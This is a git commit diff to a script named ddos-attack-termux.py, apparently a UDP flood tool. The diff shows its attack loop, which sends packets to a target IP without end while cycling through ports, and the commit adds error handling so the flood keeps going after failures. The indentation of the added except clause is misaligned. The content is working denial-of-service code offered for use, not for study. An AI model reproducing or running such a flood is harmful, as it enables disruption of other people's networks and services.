24044b42bd8961f907ada8f35a1079719434ecbc
Dee <44239838+wendale1231@users.noreply.github.com>
2020-05-26 10:09:49 +0800

    Add files via upload

--- ddos-attack-termux.py
+++ ddos-attack-termux.py
@@ -39,9 +39,12 @@ print ("[====================] 100%")
 time.sleep(3)
 sent = 0
 while True:
-     sock.sendto(bytes, (ip,int(port)))
-     sent += 1
-     port = int(port) + 1
-     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
-     if port == 65534:
-       port = 1
+     try:
+       sock.sendto(bytes, (ip,int(port)))
+       sent += 1
+       port = int(port) + 1
+       print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
+       if port == 65534:
+         port = 1
+      except:
+        print("Error Last Attack")
